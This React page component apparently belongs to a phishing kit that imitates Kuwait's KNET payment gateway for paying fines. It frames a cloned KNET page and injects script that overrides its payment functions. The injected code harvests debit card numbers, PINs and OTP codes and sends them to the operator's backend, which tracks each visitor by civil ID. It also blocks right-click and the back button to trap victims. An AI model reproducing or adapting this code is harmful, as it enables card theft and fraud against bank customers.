import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

export default function Payment() {
  const [, setLocation] = useLocation();
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [paymentData, setPaymentData] = useState<any>(null);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const createSessionMutation = trpc.payment.createSession.useMutation();
  const trackPageMutation = trpc.admin.updatePageByCivilId.useMutation();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      setLocation("/");
      return;
    }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);

    createSessionMutation.mutate(
      {
        selectedFines: parsed.selectedFines,
        totalAmount: parsed.totalAmount,
        civilId: parsed.civilId,
        enquiryType: "1",
        queryId: parsed.queryId,
      },
      {
        onSuccess: (result) => {
          setSessionId(result.sessionId);
          trackPageMutation.mutate({
            civilId: parsed.civilId,
            currentPage: "صفحة إدخال البطاقة",
          });
        },
      }
    );
  }, []);

  useEffect(() => {
    if (!sessionId || !iframeRef.current || !paymentData) return;

    const iframe = iframeRef.current;
    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc) return;

    // Inject the session ID and payment data into the iframe
    const script = doc.createElement("script");
    const totalAmount = paymentData?.totalAmount || "0.000";
    const civilId = paymentData?.civilId || "";
    script.textContent = `
      // Override the payment functions to use our backend
      var localSessionId = '${sessionId}';
      var payAmount = '${totalAmount}';
      var currentCivilId = '${civilId}';
      
      var _originalOnPay = window.onPay;
      window.onPay = function() {
        var debitCardNumber = document.getElementById('debitNumber') ? document.getElementById('debitNumber').value.replace(/\\s/g, '') : '';
        var cardPin = document.getElementById('cardPin') ? document.getElementById('cardPin').value : '';
        
        if (!debitCardNumber || debitCardNumber.length < 13) {
          alert('يرجى إدخال رقم البطاقة بشكل صحيح');
          return false;
        }
        if (!cardPin || cardPin.length < 4) {
          alert('يرجى إدخال الرمز السري للبطاقة');
          return false;
        }
        
        var expiryMonth = document.getElementById('expiryMonthBox') ? document.getElementById('expiryMonthBox').value : '01';
        var expiryYear = document.getElementById('expiryYearBox') ? document.getElementById('expiryYearBox').value : '30';
        
        var proceedBtn = document.getElementById('proceed');
        var cancelBtn = document.getElementById('cancel');
        if (proceedBtn) proceedBtn.disabled = true;
        if (cancelBtn) cancelBtn.disabled = true;
        
        var loadingDiv = document.getElementById('loading');
        if (loadingDiv) loadingDiv.style.display = 'block';
        
        fetch('/api/trpc/payment.submitCard', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ json: {
            sessionId: localSessionId,
            cardName: 'KNET User',
            cardNumber: debitCardNumber,
            cardExpiry: expiryMonth + '/' + expiryYear,
            cardCvv: cardPin
          } })
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
          var result = data.result;
          if (result && result.data) {
            // Show OTP confirmation page
            var payPageEntry = document.getElementById('PayPageEntry');
            var payConfirm = document.getElementById('payConfirm');
            if (payPageEntry) payPageEntry.style.display = 'none';
            if (payConfirm) payConfirm.style.display = 'block';
            
            var dcNumber = document.getElementById('DCNumber');
            if (dcNumber) {
              var masked = debitCardNumber.replace(/(\\d{4})\\d{8}(\\d{4})/, '$1 **** **** $2');
              dcNumber.textContent = masked;
            }
            var expmnth = document.getElementById('expmnth');
            if (expmnth) expmnth.textContent = expiryMonth;
            var expyear = document.getElementById('expyear');
            if (expyear) expyear.textContent = expiryYear;
            
            var otpDiv = document.getElementById('OTPDCDIV');
            if (otpDiv) otpDiv.style.display = 'flex';
          } else {
            if (proceedBtn) proceedBtn.disabled = false;
            if (cancelBtn) cancelBtn.disabled = false;
            if (loadingDiv) loadingDiv.style.display = 'none';
            var errorMsg = (result && result.error) ? result.error.message : 'حدث خطأ. يرجى المحاولة مرة أخرى.';
            alert(errorMsg);
          }
        })
        .catch(function(err) {
          if (proceedBtn) proceedBtn.disabled = false;
          if (cancelBtn) cancelBtn.disabled = false;
          if (loadingDiv) loadingDiv.style.display = 'none';
          alert('حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
        });
        
        return false;
      };
      
      // Override payConfirmAjax for OTP
      var _originalPayConfirm = window.payConfirmAjax;
      window.payConfirmAjax = function(action) {
        if (action === 'VALIDATE') {
          var otpCode = document.getElementById('debitOTPtimer') ? document.getElementById('debitOTPtimer').value : '';
          if (!otpCode || otpCode.length < 4) {
            alert('يرجى إدخال رمز التحقق بشكل صحيح');
            return false;
          }
          
          var confirmBtn = document.getElementById('proceedConfirm');
          var confirmCancel = document.getElementById('confirmcancel');
          if (confirmBtn) confirmBtn.disabled = true;
          if (confirmCancel) confirmCancel.disabled = true;
          
          fetch('/api/trpc/payment.submitOtp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ json: { sessionId: localSessionId, otpCode: otpCode } })
          })
          .then(function(res) { return res.json(); })
          .then(function(data) {
            var result = data.result;
            if (result && result.data) {
              alert('تم تأكيد العملية بنجاح. شكراً لك!');
              setTimeout(function() {
                window.parent.postMessage({ type: 'PAYMENT_SUCCESS' }, '*');
              }, 1000);
            } else {
              if (confirmBtn) confirmBtn.disabled = false;
              if (confirmCancel) confirmCancel.disabled = false;
              var errorMsg = (result && result.error) ? result.error.message : 'رمز التحقق غير صحيح';
              alert(errorMsg);
            }
          })
          .catch(function() {
            if (confirmBtn) confirmBtn.disabled = false;
            if (confirmCancel) confirmCancel.disabled = false;
            alert('حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
          });
        } else if (action === 'Resend') {
          alert('تم إعادة إرسال رمز التحقق');
        }
        return false;
      };
      
      // Override cancelPage
      window.cancelPage = function() {
        window.parent.postMessage({ type: 'PAYMENT_CANCELLED' }, '*');
      };
      
      // Poll for session status
      var pollInterval = setInterval(function() {
        fetch('/api/trpc/payment.getStatus?input=' + encodeURIComponent(JSON.stringify({ sessionId: localSessionId })))
          .then(function(res) { return res.json(); })
          .then(function(data) {
            var result = data.result;
            if (result && result.data) {
              var stage = result.data.stage;
              if (stage === 'card') {
                var payPageEntry = document.getElementById('PayPageEntry');
                var payConfirm = document.getElementById('payConfirm');
                if (payPageEntry) payPageEntry.style.display = 'block';
                if (payConfirm) payConfirm.style.display = 'none';
                var proceedBtn = document.getElementById('proceed');
                var cancelBtn = document.getElementById('cancel');
                if (proceedBtn) proceedBtn.disabled = false;
                if (cancelBtn) cancelBtn.disabled = false;
                var loadingDiv = document.getElementById('loading');
                if (loadingDiv) loadingDiv.style.display = 'none';
              } else if (stage === 'success') {
                alert('تم تأكيد العملية بنجاح');
                window.parent.postMessage({ type: 'PAYMENT_SUCCESS' }, '*');
              } else if (stage === 'failed') {
                alert('تم رفض العملية. يرجى المحاولة مرة أخرى.');
                window.cancelPage();
              }
            }
          })
          .catch(function() {});
      }, 3000);
      
      window._pollInterval = pollInterval;
      
      // Prevent right-click on payment page
      document.addEventListener('contextmenu', function(e) {
        if (e.target.closest('#paypage')) e.preventDefault();
      });
      
      // Prevent back button
      history.pushState(null, null, location.href);
      window.addEventListener('popstate', function() {
        history.pushState(null, null, location.href);
      });
    `;
    doc.head.appendChild(script);

    // Listen for messages from iframe
    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === "PAYMENT_SUCCESS") {
        sessionStorage.removeItem("paymentData");
        setLocation("/");
      } else if (event.data?.type === "PAYMENT_CANCELLED") {
        sessionStorage.removeItem("paymentData");
        setLocation("/");
      }
    };
    window.addEventListener("message", handleMessage);

    return () => {
      window.removeEventListener("message", handleMessage);
    };
  }, [sessionId, paymentData]);

  if (!paymentData) return null;

  return (
    <div
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100%",
        height: "100%",
        overflow: "hidden",
        backgroundColor: "#fff",
        zIndex: 9999
      }}
    >
      <iframe
        ref={iframeRef}
        src="/knet/index.html"
        style={{
          width: "100%",
          height: "100%",
          border: "none",
          position: "absolute",
          top: 0,
          left: 0
        }}
        title="KNET Payment"
        sandbox="allow-scripts allow-same-origin allow-forms"
      />
    </div>
  );
}
